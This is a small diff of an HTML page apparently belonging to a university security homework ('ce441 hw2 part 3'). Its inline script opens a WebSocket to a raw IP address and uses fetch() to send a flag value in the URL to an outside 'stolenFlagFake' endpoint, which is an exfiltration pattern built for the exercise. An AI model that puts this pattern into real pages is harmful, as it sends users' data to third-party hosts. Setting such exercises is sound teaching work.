@@ -6,11 +6,7 @@
     <body>
     this is ce441 hw2 part 3, v2
         <script>
-const ws = new WebSocket(`ws://91.107.157.58:8080/admin/ws`);
-ws.onopen = () => {
-  console.log("WebSocket connection opened");
-  websocket.send("flag");
-};
+const ws = new WebSocket(`ws://91.107.157.58:8080/ws`);
 let flag=`ce441{salam}`;
 fetch(`http://hw2p3.ckodser.ir/stolenFlagFake/${flag}`);
 ws.onmessage = (event) => {
